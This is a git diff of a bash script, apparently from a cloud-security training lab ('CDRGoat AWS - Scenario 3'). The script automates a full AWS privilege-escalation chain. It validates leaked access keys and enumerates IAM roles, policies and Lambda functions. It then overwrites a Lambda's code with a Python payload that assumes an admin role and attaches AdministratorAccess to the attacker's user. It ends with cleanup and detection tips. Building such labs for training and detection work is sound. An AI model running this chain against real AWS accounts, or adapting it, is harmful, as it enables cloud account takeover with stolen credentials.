@@ -42,95 +42,6 @@ spin_start() {
 }
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
-banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 3               ===" "${RESET}"
-  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Configuring aws credentials\n"
-  printf "  • Step 2. Permission enumeration for leaked credentials\n"
-  printf "  • Step 3. Enumerating custom roles\n"
-  printf "  • Step 4. Enumerating Lambda functions\n"
-  printf "  • Step 5. Reviewing all collected information\n"
-  printf "  • Step 6. Executing privilege escalation via Lambda\n"
-  printf "  • Step 7. Cleanup\n"
-  
-}
-banner
-
-#############################################
-# Preflight checks (no changes to your logic)
-#############################################
-step "Preflight checks"
-missing=0
-for c in aws curl jq zip; do
-  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
-done
-[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
-
-read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
-#############################################
-# Step 1. Configuring aws credentials
-#############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
-is_valid_keys() {
-  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
-  local rc=0 out
-
-  # 1) Ensure no env creds override our profile
-  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
-  PROFILE="streamgoat-scenario-3"
-
-  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
-  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
-  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
-  aws configure set region                "$region" --profile "$PROFILE"
-
-  # 3) Force the call to use our profile
-  spin_start "Validating credentials via STS"
-  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
-  spin_stop
-
-  if [ "$rc" -ne 0 ]; then
-    return 1
-  fi
-
-  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
-
-  return 0
-}
-
-step "Starting point configuration"
-while :; do
-  read -r -p "Enter leaked AWS key: " AWSKEY_USER
-  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
-  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
-    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
-    break
-  else
-    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
-  fi
-done
-
-printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
-#############################################
-# Operator explanation
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
-printf "Credentials may leak from various sources:\n"
-printf "  • Hardcoded in source code repositories\n"
-printf "  • Exposed in CI/CD logs or container images\n"
-printf "  • Leaked via misconfigured S3 buckets\n\n"
-printf "STS GetCallerIdentity confirms the credentials are valid.\n\n"
-
-#############################################
-# Step 2. Permission enumeration for leaked credentials
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
-
-# init colors (portable)
-
 try() {
   local desc="$1"; shift
   local rc
@@ -145,13 +56,107 @@ try() {
   fi
 }
 
+is_valid_keys() {
+  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
+  local rc=0 out
 
-# Identity/context
-try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
-aws sts get-caller-identity --profile "$PROFILE"
-try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"
+  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
+  PROFILE="streamgoat-scenario-3"
 
-# Inventory
+  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
+  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
+  aws configure set region                "$region" --profile "$PROFILE"
+
+  spin_start "Validating credentials via STS"
+  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
+  spin_stop
+
+  if [ "$rc" -ne 0 ]; then
+    return 1
+  fi
+
+  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
+  return 0
+}
+
+banner() {
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 3               ===" "${RESET}"
+  printf "%sLeaked Keys → IAM Enumeration → Lambda Code Injection → Privilege Escalation%s\n\n" "${GREEN}" "${RESET}"
+  printf "This automated attack script will:\n"
+  printf "  • Step 1. Configure leaked AWS credentials\n"
+  printf "  • Step 2. Enumerate permissions for leaked credentials\n"
+  printf "  • Step 3. Enumerate custom IAM roles\n"
+  printf "  • Step 4. Enumerate Lambda functions and execution roles\n"
+  printf "  • Step 5. Review findings and plan attack vector\n"
+  printf "  • Step 6. Execute privilege escalation via Lambda code injection\n"
+  printf "  • Step 7. Cleanup — detach elevated policy\n"
+}
+banner
+
+#############################################
+# Preflight checks
+#############################################
+step "Preflight checks"
+missing=0
+for c in aws jq zip; do
+  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
+done
+[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
+
+read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Step 1. Configuring AWS credentials
+#############################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials  ===" "${RESET}"
+
+step "Starting point configuration"
+while :; do
+  read -r -p "Enter leaked AWS key: " AWSKEY_USER
+  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
+  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
+    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
+    break
+  else
+    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
+  fi
+done
+
+printf "\n"
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
+printf "Credentials may leak from various sources:\n"
+printf "  • Hardcoded in source code repositories\n"
+printf "  • Exposed in CI/CD logs or container images\n"
+printf "  • Leaked via misconfigured S3 buckets\n\n"
+printf "STS GetCallerIdentity confirms the credentials are valid.\n\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Step 2. Permission enumeration for leaked credentials
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
+
+step "Identifying stolen identity"
+spin_start "Calling STS GetCallerIdentity"
+CALLER_ID="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)"
+spin_stop
+
+if [ -n "$CALLER_ID" ]; then
+  ok "Identity confirmed"
+  printf "  • Account : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Account')" "$RESET"
+  printf "  • ARN     : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Arn')" "$RESET"
+  printf "  • UserId  : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.UserId')" "$RESET"
+fi
+
+IAM_USER_NAME="$(echo "$CALLER_ID" | jq -r '.Arn' | awk -F/ '{print $NF}')"
+
+step "Probing permissions across AWS services"
+try "IAM List Roles"        aws iam list-roles --profile "$PROFILE"
 try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
 try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
 try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
@@ -165,9 +170,7 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-step "Checking managed policies attached to user: StreamGoat-user"
-
-IAM_USER_NAME="StreamGoat-user"
+step "Checking managed policies attached to user: $IAM_USER_NAME"
 
 user_managed_policies=$(aws iam list-attached-user-policies --user-name "$IAM_USER_NAME" --profile "$PROFILE" \
   --output json | jq -r '.AttachedPolicies[].PolicyArn')
@@ -179,17 +182,14 @@ else
     policy_name=$(basename "$policy_arn")
     printf "${BOLD}${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"
 
-    # Get the default version of the policy
     version_id=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" \
       --output json | jq -r '.Policy.DefaultVersionId')
 
-    # Get the actual policy document
     doc=$(aws iam get-policy-version --profile "$PROFILE" \
       --policy-arn "$policy_arn" \
       --version-id "$version_id" \
       --output json | jq -r '.PolicyVersion.Document')
 
-    # Print each statement in a clean format
     echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
       sid=$(echo "$stmt" | jq -r '.Sid // "None"')
       effect=$(echo "$stmt" | jq -r '.Effect')
@@ -201,7 +201,6 @@ else
 fi
 
 printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -209,32 +208,29 @@ read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..."
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We enumerated permissions for the leaked credentials.\n\n"
 printf "Key findings:\n"
-printf "  • ${MAGENTA}iam:ListRoles${RESET}: Can enumerate IAM roles\n"
+printf "  • ${MAGENTA}iam:List*/Get*${RESET}: Can enumerate IAM roles and policies\n"
 printf "  • ${MAGENTA}lambda:*${RESET}: Full Lambda access (except CreateFunction)\n\n"
 printf "Even without CreateFunction, we can modify existing Lambda code\n"
 printf "using ${CYAN}UpdateFunctionCode${RESET} and invoke functions.\n\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 2
 #############################################
 # Step 3. Enumerating custom roles
 #############################################
-printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Enumerating StreamGoat-Role* roles  ===" "${RESET}"
-printf "We noticed that one of successful enumeration result was for ${YELLOW}IAM List Roles${RESET}. Let's dig inside.\n"
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Enumerating StreamGoat-aws3-Role-* roles  ===" "${RESET}"
+printf "We noticed that IAM List Roles succeeded. Let's dig inside.\n"
 
-step "Enumerating IAM roles starting with 'StreamGoat-Role'"
+step "Enumerating IAM roles starting with 'StreamGoat-aws3-Role'"
 
-# List roles whose name starts with StreamGoat
-roles=$(aws iam list-roles --profile "$PROFILE" --output json | jq -r '.Roles[] | select(.RoleName | startswith("StreamGoat-Role")) | .RoleName')
+roles=$(aws iam list-roles --profile "$PROFILE" --output json | jq -r '.Roles[] | select(.RoleName | startswith("StreamGoat-aws3-Role")) | .RoleName')
 
 if [ -z "$roles" ]; then
-  err "No roles starting with 'StreamGoat' found"
+  err "No roles starting with 'StreamGoat-aws3-Role' found"
 else
   ok "Found roles:"
   echo "$roles"
 fi
 
-# Enumerate each managed role's attached and inline policies
 for role in $roles; do
   echo
   printf "${BOLD}${MAGENTA}Role: %s${RESET}\n" "$role"
@@ -245,11 +241,9 @@ for role in $roles; do
     policy_name=$(basename "$policy_arn")
     printf "  ${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"
 
-    # Get default version
     version_id=$(aws iam get-policy --profile "$PROFILE" --policy-arn "$policy_arn" --output json | jq -r '.Policy.DefaultVersionId')
     doc=$(aws iam get-policy-version --profile "$PROFILE" --policy-arn "$policy_arn" --version-id "$version_id" --output json | jq -r '.PolicyVersion.Document')
 
-    # Pretty print policy doc
     echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
       sid=$(echo "$stmt" | jq -r '.Sid // "None"')
       effect=$(echo "$stmt" | jq -r '.Effect')
@@ -261,50 +255,46 @@ for role in $roles; do
 done
 
 printf "\n"
-read -r -p "The custom role ${YELLOW}StreamGoat-Role-admin${RESET} looks interesting, so let's take its ARN for potential use in the future. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-step "Looking for StreamGoat-Role-admin..."
+STREAMGOAT_ROLE_NAME=$(echo "$roles" | grep -i "\-admin\-" | head -1)
 
-STREAMGOAT_ROLE_NAME="StreamGoat-Role-admin"
+read -r -p "The custom role ${YELLOW}${STREAMGOAT_ROLE_NAME}${RESET} looks interesting. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-# Get the full role metadata (ARN, etc.)
+step "Capturing ${STREAMGOAT_ROLE_NAME} ARN"
+
 STREAMGOAT_ROLE_ARN=$(aws iam get-role --profile "$PROFILE" --role-name "$STREAMGOAT_ROLE_NAME" \
   --output json | jq -r '.Role.Arn')
 
 if [ -n "$STREAMGOAT_ROLE_ARN" ]; then
-  ok "Captured ARN:  $STREAMGOAT_ROLE_ARN"
+  ok "Captured ARN: $YELLOW$STREAMGOAT_ROLE_ARN$RESET"
 else
   err "Could not retrieve ARN for $STREAMGOAT_ROLE_NAME"
   exit 1
 fi
 printf "\n"
-read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We enumerated IAM roles and discovered:\n\n"
-printf "  • ${MAGENTA}StreamGoat-Role-admin${RESET}: Has AdministratorAccess attached!\n\n"
+printf "  • ${MAGENTA}%s${RESET}: Has AdministratorAccess attached!\n\n" "$STREAMGOAT_ROLE_NAME"
 printf "If we can assume this role or use it via Lambda, we achieve\n"
 printf "full account compromise.\n\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 3
 #############################################
 # Step 4. Enumerating Lambda functions
 #############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Enumerating StreamGoat Lambda functions  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Enumerating StreamGoat-aws3 Lambda functions  ===" "${RESET}"
 
-# Get all Lambda functions starting with StreamGoat
-step "Fetching Lambda functions with names starting with 'StreamGoat'"
-lambda_functions=$(aws lambda list-functions --profile "$PROFILE" --output json | jq -r '.Functions[] | select(.FunctionName | startswith("StreamGoat")) | @base64')
+step "Fetching Lambda functions with names starting with 'StreamGoat-aws3'"
+lambda_functions=$(aws lambda list-functions --profile "$PROFILE" --output json | jq -r '.Functions[] | select(.FunctionName | startswith("StreamGoat-aws3")) | @base64')
 
 if [ -z "$lambda_functions" ]; then
-  err "No Lambda functions with prefix 'StreamGoat' found"
+  err "No Lambda functions with prefix 'StreamGoat-aws3' found"
   exit 0
 fi
 
-# Iterate over each Lambda
 for encoded in $lambda_functions; do
   _jq() { echo "$encoded" | base64 --decode | jq -r "$1"; }
 
@@ -312,13 +302,10 @@ for encoded in $lambda_functions; do
   ROLE_ARN=$(_jq '.Role')
   ROLE_NAME=$(basename "$ROLE_ARN")
 
-  printf "${BOLD}${MAGENTA}Lambda Function: %s${RESET}\n" "$LAMBDA_NAME"
+  printf "\n${BOLD}${MAGENTA}Lambda Function: %s${RESET}\n" "$LAMBDA_NAME"
   printf "  Execution Role: %s\n" "$ROLE_NAME"
   printf "  Role ARN:       %s\n" "$ROLE_ARN"
 
-  #############################
-  # Managed Policies
-  #############################
   attached_policies=$(aws iam list-attached-role-policies --profile "$PROFILE" --role-name "$ROLE_NAME" --output json | jq -r '.AttachedPolicies[].PolicyArn')
 
   for policy_arn in $attached_policies; do
@@ -338,31 +325,34 @@ for encoded in $lambda_functions; do
   done
 done
 
-read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+TARGET_LAMBDA=$(aws lambda list-functions --profile "$PROFILE" --output json | jq -r '.Functions[] | select(.FunctionName | startswith("StreamGoat-aws3")) | select(.FunctionName | contains("Lambda_2")) | .FunctionName')
+
+printf "\n"
 
 #############################################
 # Operator explanation
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "We discovered StreamGoat-Lambda_2 with ${MAGENTA}sts:AssumeRole${RESET} permission.\n\n"
+printf "We discovered %s with ${MAGENTA}sts:AssumeRole${RESET} permission.\n\n" "$TARGET_LAMBDA"
 printf "This allows the Lambda to assume other roles, including\n"
-printf "StreamGoat-Role-admin. If we modify the Lambda code, we can:\n"
+printf "%s. If we modify the Lambda code, we can:\n" "$STREAMGOAT_ROLE_NAME"
 printf "  • Assume the admin role\n"
 printf "  • Grant our user permanent admin access\n\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 4
 #############################################
 # Step 5. Reviewing all collected information
 #############################################
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Reviewing all collected information  ===" "${RESET}"
 printf "\n"
-printf "In step 2, we saw that our user has ${YELLOW}lambda:*${RESET} permissions, but with a specific deny for ${YELLOW}lambda:CreateFunction${RESET}.\n"
-printf "In step 4, we identified the Lambda function ${MAGENTA}StreamGoat-Lambda_2${RESET} which has a policy allowing ${YELLOW}sts:AssumeRole${RESET}.\n"
-printf "And finally, we saw ${CYAN}StreamGoat-Role-admin${RESET} role with full administrator privileges.\n"
-printf "Based on this information, our planned attack vector will be through modification of ${MAGENTA}StreamGoat-Lambda_2${RESET}:\n 1. AssumeRole ${CYAN}StreamGoat-Role-admin${RESET}\n 2. Assign Role ${CYAN}StreamGoat-Role-admin${RESET} to owned user ${YELLOW}StreamGoat-user${RESET}\n\n"
+printf "In Step 2, we saw that our user has ${YELLOW}lambda:*${RESET} permissions, but with a specific deny for ${YELLOW}lambda:CreateFunction${RESET}.\n"
+printf "In Step 4, we identified ${MAGENTA}%s${RESET} which has a policy allowing ${YELLOW}sts:AssumeRole${RESET}.\n" "$TARGET_LAMBDA"
+printf "And we found ${CYAN}%s${RESET} role with full administrator privileges.\n\n" "$STREAMGOAT_ROLE_NAME"
+printf "Planned attack vector through modification of ${MAGENTA}%s${RESET}:\n" "$TARGET_LAMBDA"
+printf "  1. Update Lambda code via ${YELLOW}UpdateFunctionCode${RESET}\n"
+printf "  2. Lambda assumes ${CYAN}%s${RESET}\n" "$STREAMGOAT_ROLE_NAME"
+printf "  3. Attach ${YELLOW}AdministratorAccess${RESET} to ${YELLOW}%s${RESET}\n\n" "$IAM_USER_NAME"
 
-read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -371,29 +361,25 @@ printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We synthesized our findings into an attack plan:\n\n"
 printf "  1. Our user has ${MAGENTA}lambda:UpdateFunctionCode${RESET}\n"
 printf "  2. Lambda_2 has ${MAGENTA}sts:AssumeRole${RESET}\n"
-printf "  3. StreamGoat-Role-admin has ${MAGENTA}AdministratorAccess${RESET}\n\n"
+printf "  3. %s has ${MAGENTA}AdministratorAccess${RESET}\n\n" "$STREAMGOAT_ROLE_NAME"
 printf "Attack: Modify Lambda to AssumeRole admin and grant us admin access.\n\n"
+read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 5
 #############################################
 # Step 6. Executing privilege escalation via Lambda
 #############################################
-
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Executing privilege escalation via Lambda  ===" "${RESET}"
-step "Preparing malicious Lambda payload..."
 
-# Variables
-TARGET_LAMBDA="StreamGoat-Lambda_2"
+step "Preparing malicious Lambda payload"
+
 ESCALATION_ROLE_ARN="$STREAMGOAT_ROLE_ARN"
-ATTACKER_USER="StreamGoat-user"
+ATTACKER_USER="$IAM_USER_NAME"
 
-# Removing artefacts from previous attempts
-rm -rf /tmp/lambda-escalation
-# Create temp directory for packaging
-mkdir -p /tmp/lambda-escalation && cd /tmp/lambda-escalation
+TMPDIR="/tmp/lambda-escalation"
+rm -rf "$TMPDIR"
+mkdir -p "$TMPDIR"
 
-cat > index.py <<EOF
+cat > "$TMPDIR/index.py" <<EOF
 import boto3
 def handler(event, context):
     sts = boto3.client("sts")
@@ -410,7 +396,6 @@ def handler(event, context):
         aws_session_token=creds["SessionToken"]
     )
 
-    # Attempt to attach admin policy to attacker user
     iam.attach_user_policy(
         UserName="${ATTACKER_USER}",
         PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
@@ -419,33 +404,29 @@ def handler(event, context):
     return "Exploit attempted"
 EOF
 
-# Create deployment package
-zip function.zip index.py >/dev/null
+(cd "$TMPDIR" && zip function.zip index.py >/dev/null)
 
-
-
-# Update Lambda code
-spin_start "Pushing update for Lambda function, it may take some time..."
+spin_start "Updating Lambda function code (waiting for deployment)"
 aws lambda update-function-code \
   --function-name "$TARGET_LAMBDA" --profile "$PROFILE" \
-  --zip-file fileb://function.zip \
+  --zip-file "fileb://$TMPDIR/function.zip" \
   --publish >/dev/null
-sleep 60
-spin_stop
 
+for i in $(seq 1 60); do
+  STATUS=$(aws lambda get-function --function-name "$TARGET_LAMBDA" --profile "$PROFILE" \
+    --query 'Configuration.LastUpdateStatus' --output text 2>/dev/null || echo "InProgress")
+  [ "$STATUS" = "Successful" ] && break
+  sleep 1
+done
+spin_stop
 ok "Lambda code updated"
 
-# Invoke Lambda to trigger escalation
 step "Triggering Lambda for privilege escalation"
-
-aws lambda invoke --profile "$PROFILE" --function-name "$TARGET_LAMBDA" /tmp/lambda_output.json >/dev/null
-
-
+aws lambda invoke --profile "$PROFILE" --function-name "$TARGET_LAMBDA" "$TMPDIR/lambda_output.json" >/dev/null
 ok "Lambda invoked. Output:"
-cat /tmp/lambda_output.json
-cd - > /dev/null
+cat "$TMPDIR/lambda_output.json"
+printf "\n"
 
-# Validate if user now has Admin policy
 step "Verifying if admin privileges were assigned to user"
 
 admin_attached=$(aws iam list-attached-user-policies --profile "$PROFILE" --user-name "$ATTACKER_USER" \
@@ -453,8 +434,10 @@ admin_attached=$(aws iam list-attached-user-policies --profile "$PROFILE" --user
 
 if [ "$admin_attached" == "AdministratorAccess" ]; then
   ok "User $ATTACKER_USER is now Admin!"
-  printf "\nLet's repeat a few of the permission enumeration attempts we performed in step 2\n"
+  printf "\nRepeating a few permission enumeration attempts from Step 2:\n"
+  spin_start "Waiting for IAM policy propagation"
   sleep 10
+  spin_stop
   try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
   try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
   try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
@@ -462,7 +445,6 @@ else
   err "Privilege escalation failed or not applied yet."
 fi
 printf "\n"
-read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -471,30 +453,23 @@ printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We executed the privilege escalation attack:\n\n"
 printf "  1. Updated Lambda code via ${MAGENTA}UpdateFunctionCode${RESET}\n"
 printf "  2. Lambda assumed admin role and attached AdministratorAccess to our user\n"
-printf "  3. Verified with permission re-enumeration - all [OK]!\n\n"
-printf "StreamGoat-user now has full admin privileges.\n\n"
-
+printf "  3. Verified with permission re-enumeration — all [OK]!\n\n"
+printf "%s now has full admin privileges.\n\n" "$ATTACKER_USER"
+read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
-# End of Step 6
+# Step 7. Cleanup — Detach elevated policy
 #############################################
-# Step 7. Cleanup — Detach elevated policy from StreamGoat-user
-#############################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Cleanup — detach AdministratorAccess from user  ===" "${RESET}"
 
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Cleanup: Detaching AdministratorAccess from the user  ===" "${RESET}"
-
-ATTACKER_USER="StreamGoat-user"
 POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
 
-rm -rf /tmp/lambda-escalation
-rm /tmp/lambda_output.json
+rm -rf "$TMPDIR"
 
-# Detach the policy
 aws iam detach-user-policy \
   --user-name "$ATTACKER_USER" --profile "$PROFILE" \
   --policy-arn "$POLICY_ARN" && ok "Detached AdministratorAccess from $ATTACKER_USER"
 
-# Verify it's gone
 attached=$(aws iam list-attached-user-policies \
   --user-name "$ATTACKER_USER" --profile "$PROFILE" \
   --output json | jq -r '.AttachedPolicies[]?.PolicyArn')
@@ -504,6 +479,7 @@ if echo "$attached" | grep -q "$POLICY_ARN"; then
 else
   ok "Cleanup verified — no elevated policy remains"
 fi
+
 ################################################################################
 # Final Summary
 ################################################################################
@@ -511,9 +487,9 @@ printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${R
 
 printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
 printf "  1. Validated leaked IAM user credentials\n"
-printf "  2. Enumerated permissions (lambda:*, iam:ListRoles)\n"
-printf "  3. Discovered StreamGoat-Role-admin with AdministratorAccess\n"
-printf "  4. Found Lambda_2 with sts:AssumeRole permission\n"
+printf "  2. Enumerated permissions (lambda:*, iam:List*/Get*)\n"
+printf "  3. Discovered %s with AdministratorAccess\n" "$STREAMGOAT_ROLE_NAME"
+printf "  4. Found %s with sts:AssumeRole permission\n" "$TARGET_LAMBDA"
 printf "  5. Modified Lambda code via UpdateFunctionCode\n"
 printf "  6. Lambda assumed admin role and attached AdministratorAccess to user\n\n"
 
@@ -528,5 +504,4 @@ printf "  • AssumeRole calls to privileged roles\n"
 printf "  • AttachUserPolicy/AttachRolePolicy to admin policies\n"
 printf "  • Credential usage from unexpected locations\n\n"
 
-printf "\n"
 read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
